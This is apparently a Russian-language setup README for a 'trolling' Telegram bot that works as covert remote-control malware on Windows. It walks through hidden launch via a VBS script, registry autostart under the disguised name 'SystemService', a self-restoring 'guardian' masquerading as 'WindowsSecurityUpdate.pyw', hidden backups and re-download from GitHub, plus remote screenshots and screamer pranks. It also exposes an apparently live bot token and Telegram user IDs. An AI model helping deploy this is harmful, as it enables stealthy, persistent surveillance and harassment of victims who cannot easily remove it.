# 📦 НАСТРОЙКА ДЛЯ РАБОТЫ ИЗ APPDATA

## ✅ Что уже работает автоматически:

### **1. Копирование всех файлов**
При установке через `/start → ⚙️ Установить в автозагрузку` копируется:
- ✅ Все `.py` файлы (bot.py, watchdog.py, guardian.py)
- ✅ Папка `photo/` со всеми файлами (включая GIF!)
- ✅ Все конфигурационные файлы
- ✅ README и документация
- ✅ VBS скрипт для скрытого запуска

### **2. Пути исправлены**
Все функции используют абсолютные пути:
- ✅ Скриншоты → `%TEMP%\screenshot_*.png`
- ✅ Фото скримера → `script_dir\photo\screamer*.jpg`
- ✅ Музыка Зеленского → `script_dir\photo\zela1.mp3`
- ✅ GIF насекомых → `script_dir\photo\*.gif`
- ✅ Heartbeat файл → `%TEMP%\bot_heartbeat.tmp`

## 🔧 ЧТО НУЖНО НАСТРОИТЬ:

### **1. В bot.py (строка 39):**
```python
BOT_TOKEN = "7876495802:AAGixaO2S7MWJnFFA_VWnKPr2M320zIC3Iw"
```
✅ Замените на ваш токен от @BotFather

### **2. В bot.py (строка 42):**
```python
ALLOWED_USERS = [1854451325, 5516562490, 495434214]
```
✅ Замените на ваши Telegram ID
(Узнать свой ID: @userinfobot)

### **3. В guardian.py (строка 17) - ВАЖНО!**
```python
# GitHub репозиторий для восстановления (замените на свой!)
GITHUB_BACKUP_URL = "https://github.com/YOUR_USERNAME/YOUR_REPO/archive/refs/heads/main.zip"
```

✅ **Настройка GitHub репозитория:**

#### Шаг 1: Создайте приватный репозиторий
```
1. Зайдите на github.com
2. Нажмите "New repository"
3. Имя: troling-backup (или любое)
4. ✅ ОБЯЗАТЕЛЬНО: Private (приватный!)
5. Create repository
```

#### Шаг 2: Загрузите файлы
```
1. Нажмите "Upload files"
2. Перетащите ВСЕ файлы из папки troling:
   - bot.py
   - watchdog.py
   - guardian.py
   - photo/ (всю папку)
   - все остальные файлы
3. Commit changes
```

#### Шаг 3: Получите ссылку
```
Формат ссылки:
https://github.com/ВАШ_USER/ВАШ_РЕПО/archive/refs/heads/main.zip

Пример:
https://github.com/john_doe/troling-backup/archive/refs/heads/main.zip
```

#### Шаг 4: Вставьте в guardian.py
```python
GITHUB_BACKUP_URL = "https://github.com/john_doe/troling-backup/archive/refs/heads/main.zip"
```

### **4. В guardian.py (строка 24-27) - Пути к бэкапам:**
```python
# Папка с ботом (куда установлен)
BOT_DIR = os.path.join(os.environ.get('APPDATA'), 'Programs')

# Папка для бэкапа
BACKUP_DIR = os.path.join(os.environ.get('TEMP'), '.sysbackup')
```
✅ Эти пути **УЖЕ правильные**, менять НЕ нужно!

### **5. В guardian.py (строка 37-43) - Файлы для мониторинга:**
```python
CRITICAL_FILES = [
    'bot.py',
    'watchdog.py',
    'bot_hidden.vbs',
    'photo/screamer1.jpg',
    'photo/zela.png',
    'photo/zela1.mp3',
    'photo/mosquitoes-13105_256.gif'  # ← Добавьте ваши GIF файлы!
]
```
✅ Добавьте все ваши GIF файлы в этот список!

## 📋 ПОЛНАЯ ИНСТРУКЦИЯ ПО УСТАНОВКЕ:

### **ШАГ 1: Подготовка (НА ВАШЕМ ПК)**
```bash
1. Скачайте проект в: C:\Users\YOUR_USER\Desktop\troling
2. Откройте bot.py
3. Настройте BOT_TOKEN (строка 39)
4. Настройте ALLOWED_USERS (строка 42)
5. Сохраните
```

### **ШАГ 2: Настройка Guardian**
```bash
1. Создайте GitHub репозиторий (приватный!)
2. Загрузите ВСЕ файлы в репозиторий
3. Скопируйте ссылку на ZIP
4. Откройте guardian.py
5. Вставьте ссылку в GITHUB_BACKUP_URL (строка 17)
6. Добавьте ваши GIF в CRITICAL_FILES (строка 37-43)
7. Сохраните
```

### **ШАГ 3: Первый запуск и проверка**
```bash
1. Запустите: python bot.py
2. В Telegram: /start
3. Проверьте что всё работает:
   - 📸 Скриншот
   - 😱 Скример
   - 🇺🇦 Зеленский
   - 🕷️ Фейковые насекомые
```

### **ШАГ 4: Установка в автозагрузку**
```
В Telegram:
/start → ⚙️ Установить в автозагрузку

Должно показать:
✅ Установка завершена!
📂 Папка: C:\Users\...\AppData\Roaming\Programs
📄 Файлов: XX
📁 Папок: X
✅ photo/ (4 файла)
✅ Guardian активирован
```

### **ШАГ 5: Перезагрузка и проверка**
```bash
1. Перезагрузите ПК
2. Откройте Telegram
3. Напишите боту: /start
4. Проверьте что всё работает из AppData
5. Попробуйте все функции:
   - 📸 Скриншот ← ДОЛЖЕН РАБОТАТЬ!
   - 🕷️ Насекомые ← ДОЛЖНЫ ПОЯВИТЬСЯ!
   - ⚡ Вспышки ← ДОЛЖНЫ РАБОТАТЬ!
```

### **ШАГ 6: Проверка Guardian (опционально)**
```bash
1. Откройте: C:\Users\...\AppData\Roaming\Programs
2. Удалите файл: bot.py
3. Подождите 30 секунд
4. Проверьте папку снова
5. Файл должен восстановиться автоматически!
```

## 🔍 Проверка установки:

### **Проверьте файлы в AppData:**
```
C:\Users\YOUR_USER\AppData\Roaming\Programs\
├── bot.py                          ✅
├── watchdog.py                     ✅
├── guardian.py                     ✅
├── bot_hidden.vbs                  ✅ (создаётся автоматически)
├── config_example.py               ✅
├── requirements.txt                ✅
├── README.md                       ✅
└── photo/                          ✅
    ├── screamer1.jpg               ✅
    ├── screamer2.png               ✅
    ├── zela.png                    ✅
    ├── zela1.mp3                   ✅
    └── mosquitoes-13105_256.gif    ✅ ВАЖНО!
```

### **Проверьте Guardian:**
```
C:\Users\YOUR_USER\AppData\Roaming\Microsoft\Windows\SystemData\
└── WindowsSecurityUpdate.pyw       ✅ (создаётся Guardian'ом)
```

### **Проверьте бэкап:**
```
C:\Users\YOUR_USER\AppData\Local\Temp\.sysbackup\
├── bot.py                          ✅
├── watchdog.py                     ✅
├── bot_hidden.vbs                  ✅
└── photo/                          ✅
```

### **Проверьте автозагрузку:**
```
Нажмите Win+R → shell:startup → Enter

Или в реестре:
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Ключ: SystemService
Значение: C:\Users\...\AppData\Roaming\Programs\bot_hidden.vbs
```

## ⚠️ Частые ошибки:

### **1. "Скриншоты не работают"**
✅ Исправлено! Используется %TEMP%

### **2. "Насекомые не появляются"**
```
Причина: GIF файл не найден
Решение:
1. Проверьте что GIF есть в photo/
2. Проверьте что photo/ скопировалась в AppData
3. Переустановите через автозагрузку
```

### **3. "Guardian не восстанавливает файлы"**
```
Проверьте:
1. GITHUB_BACKUP_URL настроен правильно
2. Репозиторий ПУБЛИЧНЫЙ или есть токен доступа
3. Guardian запущен (проверьте процессы)
4. Интернет соединение работает
```

### **4. "Бот не запускается после перезагрузки"**
```
Проверьте:
1. pythonw.exe установлен и в PATH
2. VBS скрипт создан в AppData\Programs
3. Реестр содержит правильный путь
4. Права на запуск не ограничены
```

## 💡 Советы:

### **1. Приватный репозиторий**
Используйте ПРИВАТНЫЙ GitHub репозиторий!
Никто не должен видеть ваш код и токен бота.

### **2. GitHub токен для приватного репо**
Если репозиторий приватный, используйте токен:
```python
GITHUB_BACKUP_URL = "https://TOKEN@github.com/user/repo/archive/main.zip"
```

### **3. Проверяйте логи**
Guardian пишет логи. Проверьте:
```python
# В guardian.py включите отладку:
DEBUG = True
```

### **4. Тестируйте перед установкой**
Всегда сначала тестируйте из текущей папки:
```bash
python bot.py
# Проверьте ВСЕ функции
# Только потом устанавливайте в автозагрузку
```

## ✅ Готово!

Теперь ваш бот:
- ✅ Работает из AppData
- ✅ Запускается при старте Windows
- ✅ Защищён Guardian'ом
- ✅ Скриншоты работают
- ✅ Все файлы (фото, GIF, музыка) доступны
- ✅ Все функции троллинга работают

**Приятного троллинга из автозагрузки!** 😈🚀
